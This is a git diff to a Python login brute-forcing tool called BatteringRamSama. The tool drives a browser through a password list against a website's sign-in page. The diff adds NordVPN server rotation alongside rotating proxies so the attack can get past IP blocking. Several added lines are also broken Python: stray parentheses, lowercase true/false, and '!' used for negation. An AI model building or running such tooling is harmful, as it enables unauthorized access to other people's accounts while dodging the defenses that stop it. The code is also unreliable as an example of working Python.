@@ -64,9 +64,20 @@ class BatteringRamSama():
         self.passwordXpath=str(conf['WEB_SETTINGS']['password_xpath'])
         self.submitButtonXpath=str(conf['WEB_SETTINGS']['submit_button_xpath'])
         
+        self.nordPassword=str(conf['NORD_SETTINGS']['nord_password']))
+        self.nordUsername=str(conf['NORD_SETTINGS']['nord_username']))
+        if self.nordPassword !="" and self.nordUsername!="":
+            self.nord=true
+        else:
+            self.nord=false
+            proxies=getProxies()
+            self.proxyAddresses=proxies.returnIPs()
+            self.proxyPorts=proxies.returnPorts()
+        
+        
     def BruteForceTime(self):
         f=open(self.passwordFile,'r')
-        password='oof'
+        password='greaterThanOne'
         counter=self.changeProxy
         first=True
         i=0
@@ -79,22 +90,26 @@ class BatteringRamSama():
                 if counter>=self.changeProxy:
                     if not first:
                         self.driver.close()        
-
-                    self.driver=changeProxy(self.proxyAddresses[i],self.proxyPorts[i])
+                    if self.nord:
+                        linuxNordVPN(i,self.nordUsername,self.nordPassword)
+                        self.driver=webdriver.Firefox()
+                    else:
+                        self.driver=changeProxy(self.proxyAddresses[i],self.proxyPorts[i])
                     try:
                         self.driver.get(self.signInPage)
                         badConn=False
                     except:
                         badConn=True
-                        self.proxyAddresses.remove(self.proxyAddresses[i])
-                        self.proxyPorts.remove(self.proxyPorts[i])
+                        if !self.nord:
+                            self.proxyAddresses.remove(self.proxyAddresses[i])
+                            self.proxyPorts.remove(self.proxyPorts[i])
                         counter+=self.changeProxy
                     counter=0
                     first=False
                     i+=1                
-                if i>=len(self.proxyAddresses):
+                if i>=len(self.proxyAddresses) and !self.nord:
                     i=0
-                if (startTime-int(calendar.timegm(time.gmtime())))/3600>self.resetProxies:
+                if (startTime-int(calendar.timegm(time.gmtime())))/3600>self.resetProxies and !self.nord:
                     proxies=getProxies()
                     self.proxyAddresses=proxies.returnIPs()
                     self.proxyPorts=proxies.returnPorts()
